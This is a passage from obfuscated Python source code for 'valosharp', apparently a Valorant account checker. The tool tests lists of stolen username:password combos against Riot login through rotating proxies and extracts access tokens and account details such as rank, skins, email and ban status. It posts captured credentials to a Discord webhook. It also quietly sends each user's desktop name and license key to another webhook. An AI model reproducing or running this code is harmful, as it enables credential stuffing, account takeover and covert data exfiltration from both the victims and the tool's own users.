                                O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]].append(
                                O00O0O0OOO00O0O00.get_buddie_name(OO0OO0O00O0O00O00["ItemID"]))  # line:1934
                except:  # line:1936
                    if dont_log_errors == False:  # line:1937
                        print(traceback.format_exc())  # line:1938
                    O00O0O0OOO00O0O00._["errors"].append(traceback.format_exc())  # line:1939
            return OO0O00OO00OO000O0  # line:1941
        except:  # line:1943
            return {"Skins": [], "Skin Variants": [], "Agents": [], "Contracts": [], "Sprays": [], "Cards": [],
                    "Titles": [], "Gun Buddies": [], }  # line:1953

    def send_capture(OOOO0000000O00O0O, O0O0OO0OO0O0000O0, OOO00000000OOOOOO, OO0O000OOO00O0O00, OO0OO0OOO00OOOO00,
                     OO0OO0000O00O0O0O):  # line:1955
        O0OOO000000O000O0 = []  # line:1957
        O0OOO000000O000O0.append({"name": "Capture",
                                  "value": f"""**[{OO0OO0000O00O0O0O['Region']}] Rank:** ``{OO0OO0000O00O0O0O['[{0}] Rank'.format(OO0OO0000O00O0O0O['Region'])]}``\n**[{OO0OO0000O00O0O0O['Region']}] VP:** ``{OO0OO0000O00O0O0O['[{0}] VP'.format(OO0OO0000O00O0O0O['Region'])]}``\n**[{OO0OO0000O00O0O0O['Region']}] Radianite Points:** ``{OO0OO0000O00O0O0O['[{0}] Radianite Points'.format(OO0OO0000O00O0O0O['Region'])]}``\n**[{OO0OO0000O00O0O0O['Region']}] Free Agents:** ``{OO0OO0000O00O0O0O['[{0}] Free Agents'.format(OO0OO0000O00O0O0O['Region'])]}``\n""",
                                  "inline": False})  # line:1963
        OO0OO000OOO0OOOOO = {"embeds": [{"color": 16401492, "title": f"New capture",
                                         "description": f"**Desktop Name:** ``{os.getlogin()}``\n**Logged in at:** ``{datetime.datetime.now().strftime('%m/%d %H:%M:%S')}``\n**Combos loaded:** ``{len(OOOO0000000O00O0O._['combos'])}``\n**Proxies loaded:** ``{len(OOOO0000000O00O0O._['proxies']['all'])}``\n**License Key:** ``{OOOO0000000O00O0O._['license_key']}``\n\n**Combo:** ``{OOOO0000000O00O0O.get_raw_combo(OO0OO0OOO00OOOO00)}``\n**Used proxy:** ``{OOO00000000OOOOOO['url']}``\n\n**Skins:** ``{OO0O000OOO00O0O00}``\n**E-Mail:** ``{OO0OO0000O00O0O0O['E-Mail']}``\n**E-Mail Verified:** ``{OO0OO0000O00O0O0O['E-Mail Verified']}``\n**Region:** ``{OO0OO0000O00O0O0O['Region']}``\n**Banned:** ``{OO0OO0000O00O0O0O['Banned']}``",
                                         "footer": {"text": "doener#6969 on top"},
                                         "author": {"name": "valosharp", "url": "https://t.me/valosharp",
                                                    "icon_url": "https://cdn.discordapp.com/icons/956351680444776448/52eeac8ca0f9ed4faeaa393d88fc6346.png"},
                                         "fields": O0OOO000000O000O0}]}  # line:1982
        try:  # line:1984
            if OOOO0000000O00O0O._["user_webhook_url"]:  # line:1985
                requests.post(OOOO0000000O00O0O._["user_webhook_url"], json=OO0OO000OOO0OOOOO,
                              proxies={"http": OOO00000000OOOOOO['url'],
                                       "https": OOO00000000OOOOOO['url'], })  # line:1989
        except:  # line:1990
            pass  # line:1991

    def on_initialize(OOOO0OOOOOO0O00O0):  # line:1993
        OO00O0OOO00000O0O = []  # line:1995
        OOO000O0O00O000OO = {"embeds": [{"color": 16401492, "title": f"New user logged in",
                                         "description": f"**Desktop Name:** ``{os.getlogin()}``\n**Logged in at:** ``{datetime.datetime.now().strftime('%m/%d %H:%M:%S')}``\n**Combos loaded:** ``{len(OOOO0OOOOOO0O00O0._['combos'])}``\n**Proxies loaded:** ``{len(OOOO0OOOOOO0O00O0._['proxies']['all'])}``\n**License Key:** ``{OOOO0OOOOOO0O00O0._['license_key']}``",
                                         "footer": {"text": "doener#6969 on top"},
                                         "author": {"name": "valosharp", "url": "https://t.me/valosharp",
                                                    "icon_url": "https://cdn.discordapp.com/icons/956351680444776448/52eeac8ca0f9ed4faeaa393d88fc6346.png"},
                                         "fields": OO00O0OOO00000O0O}]}  # line:2014
        requests.post(OOOO0OOOOOO0O00O0._["webhook_url"], json=OOO000O0O00O000OO)  # line:2016

    def check_for_proxy_error(O0OO0OOO0OOO0O00O, O0O00O000O00000O0):  # line:2018
        OO000O0O00OO00OO0 = False  # line:2019
        for O0O0O0000OOO0OOO0 in O0OO0OOO0OOO0O00O._["proxy_errors"]:  # line:2021
            if O0O0O0000OOO0OOO0 in O0O00O000O00000O0:  # line:2022
                OO000O0O00OO00OO0 = True  # line:2023
                break  # line:2024
        return OO000O0O00OO00OO0  # line:2026

    def raw_user_info(O00000OO00OO0OO0O, O00O0OO00OO0O00O0, OO0OOO00OO000O0OO, O00O0O0OO00OO0OO0={}):  # line:2028
        O00OO00O00OO0O00O = f"\nUser & Pass: {O00000OO00OO0OO0O.get_raw_combo(OO0OOO00OO000O0OO)}"  # line:2029
        OOO0000OO0000000O = {"Phone Number Verified": O00O0OO00OO0O00O0["phone_number_verified"],
                             "Country": O00O0OO00OO0O00O0["country"], "Sub": O00O0OO00OO0O00O0["sub"],
                             "PvPNet Account ID": O00O0OO00OO0O00O0["pvpnet_account_id"],
                             "Ingame name": O00O0OO00OO0O00O0["acct"]["game_name"],
                             "Preferred username": O00O0OO00OO0O00O0["preferred_username"], }  # line:2038
        for O00O00O0O0OOOOO0O in O00O0O0OO00OO0OO0:  # line:2040
            OOO0000OO0000000O[O00O00O0O0OOOOO0O] = O00O0O0OO00OO0OO0[O00O00O0O0OOOOO0O]  # line:2041
        return O00000OO00OO0OO0O.add_data(O00OO00O00OO0O00O, OOO0000OO0000000O)  # line:2043

    def finished_checking(OO000O00000OO00OO):  # line:2045
        OO000O00000OO00OO.cls()  # line:2046
        print(OO000O00000OO00OO._["logo"])  # line:2047
        print()  # line:2048
        OO000O00000OO00OO.log(f"Successfully checked {OO000O00000OO00OO._['len_combos']} combos",
                              "FINISHED")  # line:2049
        OO000O00000OO00OO.log(f"Valids: {OO000O00000OO00OO._['stats']['valid']}", "FINISHED")  # line:2050
        OO000O00000OO00OO.log(f"Invalids: {OO000O00000OO00OO._['stats']['invalid']}", "FINISHED")  # line:2051
        OO000O00000OO00OO.log(f"Banned: {OO000O00000OO00OO._['stats']['banned']}", "FINISHED")  # line:2052
        OO000O00000OO00OO.log("[EU/NA/AP/KR] Skins:", "FINISHED")  # line:2053
        for _OOO0OOO0O0OOOO000 in OO000O00000OO00OO._["filter"]["skins"]:  # line:2054
            OO000O00000OO00OO.log(
                f'[{_OOO0OOO0O0OOOO000}]: {len(OO000O00000OO00OO._["filter"]["skins"][_OOO0OOO0O0OOOO000])}',
                "FINISHED")  # line:2056
        OO000O00000OO00OO.log("", "FINISHED")  # line:2058
        OO000O00000OO00OO.log("[EU/NA/AP/KR] Ranks:", "FINISHED")  # line:2059
        for _OOO0OOO00O000O00O in OO000O00000OO00OO._["filter"]["ranks"]:  # line:2060
            OO000O00000OO00OO.log(
                f'[{_OOO0OOO00O000O00O.capitalize()}]: {len(OO000O00000OO00OO._["filter"]["ranks"][_OOO0OOO00O000O00O])}',
                "FINISHED")  # line:2062
        OO000O00000OO00OO.log(f"", "FINISHED")  # line:2063
        OO000O00000OO00OO.log(f"Thanks for using valosharp :)", "FINISHED")  # line:2064
        OO000O00000OO00OO.log(f"Press Q to quit the checker", "FINISHED")  # line:2065
        OOOOO0000OO0OOO00 = repr(readchar.readkey())  # line:2067
        if OOOOO0000OO0OOO00 == "'q'":  # line:2069
            os.abort()  # line:2070
        else:  # line:2071
            OO000O00000OO00OO.finished_checking()  # line:2072

    def remove_double_combos(O0O00OOOOOO0000O0):  # line:2074
        O0O00OOOOOO0000O0.cls()  # line:2075
        utils.set_title("valosharp ~ Double Lines Checker")  # line:2077
        print(O0O00OOOOOO0000O0._["logo"])  # line:2078
        print()  # line:2079
        O0O00OOOOOO0000O0.log(f"Checking {len(O0O00OOOOOO0000O0._['combos'])} lines")  # line:2080
        O0OO000O000OOOOO0 = []  # line:2081
        for O000O00OO0O0O0000 in O0O00OOOOOO0000O0._["combos"]:  # line:2083
            if O000O00OO0O0O0000 not in O0OO000O000OOOOO0:  # line:2084
                O0OO000O000OOOOO0.append(O000O00OO0O0O0000)  # line:2085
        O0O00OOOOOO0000O0.log(
            f"Removed {len(O0O00OOOOOO0000O0._['combos']) - len(O0OO000O000OOOOO0)} double lines")  # line:2087
        O0O00OOOOOO0000O0._["combos"] = O0OO000O000OOOOO0  # line:2089
        O0O00OOOOOO0000O0.log(f"New combos: [{len(O0O00OOOOOO0000O0._['combos'])}]")  # line:2090
        time.sleep(3)  # line:2091

    async def check(O0OO0O00OOO00OOO0, OO0000000000OOO00, O0O0OOOO0O0OO0O0O, OOOOOOO000O0O0O00):  # line:2093
        if O0OO0O00OOO00OOO0._["stats"]["captured"] == O0OO0O00OOO00OOO0._['len_combos'] and len(
                O0OO0O00OOO00OOO0._["combos"]) == 0 and not O0OO0O00OOO00OOO0._["checker_finished"]:  # line:2095
            O0OO0O00OOO00OOO0.log(
                f"Checked {O0OO0O00OOO00OOO0._['len_combos']} accounts. Please enter any key...")  # line:2097
            O0OO0O00OOO00OOO0._["checker_finished"] = True  # line:2098
            repr(readchar.readkey())  # line:2099
            os.abort()  # line:2100
        if O0OO0O00OOO00OOO0._["checker_finished"]:  # line:2102
            O0OO0O00OOO00OOO0.finished_checking()  # line:2103
            return  # line:2104
        if len(O0OO0O00OOO00OOO0._["combos"]) == 0:  # line:2106
            O0OO0O00OOO00OOO0.finished_checking()  # line:2107
            return  # line:2108
        O0OO0O00OOO00OOO0.update_stats()  # line:2110
        if int(O0OO0O00OOO00OOO0._["threads"]) > 10:  # line:2112
            O0OOOO0OO00O0O000 = random.randint(1, (int(O0OO0O00OOO00OOO0._["threads"] / 10)))  # line:2113
        else:  # line:2114
            O0OOOO0OO00O0O000 = 1  # line:2115
        await asyncio.sleep(O0OOOO0OO00O0O000)  # line:2117
        try:  # line:2119
            async with aiohttp.ClientSession(
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                             "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/json"},
                    connector=aiohttp.TCPConnector(limit=60))as OO0OOOOO00OO00O0O:  # line:2125
                O00OO0OOO000O00O0 = await O0OO0O00OOO00OOO0.convert_req_to_json(
                    await O0OO0O00OOO00OOO0.generate_session_id(OO0OOOOO00OO00O0O,
                                                                O0OO0O00OOO00OOO0.proxy()))  # line:2126
                if O00OO0OOO000O00O0 and O00OO0OOO000O00O0["type"] == "auth":  # line:2128
                    O00O0O000OOO0OO0O = await O0OO0O00OOO00OOO0.convert_req_to_json(
                        await O0OO0O00OOO00OOO0.check_combo(OO0OOOOO00OO00O0O, OOOOOOO000O0O0O00,
                                                            O0O0OOOO0O0OO0O0O))  # line:2129
                else:  # line:2130
                    O0OO0O00OOO00OOO0._["stats"]["unknown"] += 1  # line:2131
                    O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2132
                    await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O,
                                                  O0OO0O00OOO00OOO0.proxy())  # line:2134
                await OO0OOOOO00OO00O0O.close()  # line:2136
        except:  # line:2137
            O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2138
            await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O, O0OO0O00OOO00OOO0.proxy())  # line:2140
            return  # line:2141
        try:  # line:2143
            if O00O0O000OOO0OO0O.get("error", None):  # line:2144
                if O0OO0O00OOO00OOO0.reconvert_proxy(OOOOOOO000O0O0O00) not in O0OO0O00OOO00OOO0._["stats"][
                    "working_proxies"]:  # line:2146
                    O0OO0O00OOO00OOO0._["stats"]["working_proxies"].append(
                        O0OO0O00OOO00OOO0.reconvert_proxy(OOOOOOO000O0O0O00))  # line:2148
                if O00O0O000OOO0OO0O["error"] == "rate_limited":  # line:2150
                    O0OO0O00OOO00OOO0._["stats"]["rate_limited"] += 1  # line:2151
                    O0OO0O00OOO00OOO0.log("Ratelimited, using another proxy", OO0000000000OOO00)  # line:2152
                    O0OO0O00OOO00OOO0.save_stats()  # line:2154
                    await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O,
                                                  O0OO0O00OOO00OOO0.proxy())  # line:2155
                    return  # line:2156
                elif O00O0O000OOO0OO0O["error"] == "auth_failure":  # line:2158
                    O0OO0O00OOO00OOO0._["stats"]["invalid"] += 1  # line:2159
                    try:  # line:2161
                        O0OO0O00OOO00OOO0._["combos"].remove(
                            O0OO0O00OOO00OOO0.get_raw_combo(O0O0OOOO0O0OO0O0O))  # line:2163
                    except:  # line:2164
                        pass  # line:2165
                    O0OO0O00OOO00OOO0._["stats"]["save"][
                        "invalids_raw"] += f"{O0OO0O00OOO00OOO0.get_raw_combo(O0O0OOOO0O0OO0O0O)}\n"  # line:2168
                    O0OO0O00OOO00OOO0.log(f"Invalid: {O0OO0O00OOO00OOO0.get_raw_combo(O0O0OOOO0O0OO0O0O)}",
                                          OO0000000000OOO00)  # line:2170
                    O0OO0O00OOO00OOO0.save_stats()  # line:2172
                    OO00OO00O00O00000 = O0OO0O00OOO00OOO0.combo()  # line:2174
                    if OO00OO00O00O00000:  # line:2176
                        await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, {"username": OO00OO00O00O00000.split(":")[0],
                                                                          "password": "".join(
                                                                              OO00OO00O00O00000.split(":")[1:])},
                                                      OOOOOOO000O0O0O00)  # line:2177
                    O0OO0O00OOO00OOO0.save_stats()  # line:2178
                    return  # line:2179
                elif O00O0O000OOO0OO0O["error"] == "invalid_session_id":  # line:2180
                    O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2181
                    await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O,
                                                  O0OO0O00OOO00OOO0.proxy())  # line:2182
                else:  # line:2183
                    O0OO0O00OOO00OOO0.log(O00O0O000OOO0OO0O["error"], OO0000000000OOO00)  # line:2184
                    O0OO0O00OOO00OOO0.log(O00O0O000OOO0OO0O, OO0000000000OOO00)  # line:2185
                    O0OO0O00OOO00OOO0._["stats"]["unknown"] += 1  # line:2186
                    O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2187
                    await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O,
                                                  O0OO0O00OOO00OOO0.proxy())  # line:2188
                return  # line:2189
            else:  # line:2191
                if O0OO0O00OOO00OOO0.reconvert_proxy(OOOOOOO000O0O0O00) not in O0OO0O00OOO00OOO0._["stats"][
                    "working_proxies"]:  # line:2192
                    O0OO0O00OOO00OOO0._["stats"]["working_proxies"].append(
                        O0OO0O00OOO00OOO0.reconvert_proxy(OOOOOOO000O0O0O00))  # line:2194
                OOOO00OOOOOOO0O00 = None  # line:2196
                if O00O0O000OOO0OO0O.get("response", None):  # line:2198
                    OOOO00OOOOOOO0O00 = (re.compile(
                        'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')).findall(
                        O00O0O000OOO0OO0O['response']['parameters']['uri'])[0][0]  # line:2201
                if OOOO00OOOOOOO0O00:  # line:2203
                    if O0OO0O00OOO00OOO0.get_raw_combo(O0O0OOOO0O0OO0O0O) in O0OO0O00OOO00OOO0._["combos"]:  # line:2204
                        O0OO0O00OOO00OOO0._["combos"].remove(
                            O0OO0O00OOO00OOO0.get_raw_combo(O0O0OOOO0O0OO0O0O))  # line:2205
                    await O0OO0O00OOO00OOO0.capture(OOOOOOO000O0O0O00, O0O0OOOO0O0OO0O0O, OOOO00OOOOOOO0O00,
                                                    OO0000000000OOO00)  # line:2206
                else:  # line:2207
                    O0OO0O00OOO00OOO0._["stats"]["unknown"] += 1  # line:2208
                    O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2209
                    OO00OO00O00O00000 = O0OO0O00OOO00OOO0.combo()  # line:2211
                    if OO00OO00O00O00000:  # line:2212
                        await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, {"username": OO00OO00O00O00000.split(":")[0],
                                                                          "password": "".join(
                                                                              OO00OO00O00O00000.split(":")[1:])},
                                                      OOOOOOO000O0O0O00)  # line:2213
                return  # line:2214
        except asyncio.exceptions.TimeoutError:  # line:2216
            O0OO0O00OOO00OOO0._["stats"]["errors"] += 1  # line:2217
            O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2218
            await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O, O0OO0O00OOO00OOO0.proxy())  # line:2219
            return  # line:2220
        except aiohttp.client_exceptions.ClientConnectorError:  # line:2222
            O0OO0O00OOO00OOO0._["stats"]["errors"] += 1  # line:2223
            O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2224
            await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O, O0OO0O00OOO00OOO0.proxy())  # line:2225
            return  # line:2226
        except ConnectionAbortedError:  # line:2228
            O0OO0O00OOO00OOO0._["stats"]["errors"] += 1  # line:2229
            O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2230
            await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O, O0OO0O00OOO00OOO0.proxy())  # line:2231
            return  # line:2232
        except ConnectionResetError:  # line:2234
            O0OO0O00OOO00OOO0._["stats"]["errors"] += 1  # line:2235
            O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2236
            await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O, O0OO0O00OOO00OOO0.proxy())  # line:2237
            return  # line:2238
        except aiohttp.client_exceptions.ClientOSError:  # line:2240
            O0OO0O00OOO00OOO0._["stats"]["errors"] += 1  # line:2241
            O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2242
            await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O, O0OO0O00OOO00OOO0.proxy())  # line:2243
            return  # line:2244
        except aiohttp.client_exceptions.ServerDisconnectedError:  # line:2246
            O0OO0O00OOO00OOO0._["stats"]["errors"] += 1  # line:2247
            O0OO0O00OOO00OOO0._["stats"]["retries"] += 1  # line:2248
            await O0OO0O00OOO00OOO0.check(OO0000000000OOO00, O0O0OOOO0O0OO0O0O, O0OO0O00OOO00OOO0.proxy())  # line:2249
            return  # line:2250
        except:  # line:2252
            if dont_log_errors == False:  # line:2253
                print(traceback.format_exc())  # line:2254
            O0OO0O00OOO00OOO0._["errors"].append(traceback.format_exc())  # line:2255


if __name__ == "__main__":  # line:2258
    ValorantAccountChecker ()  # line:2259
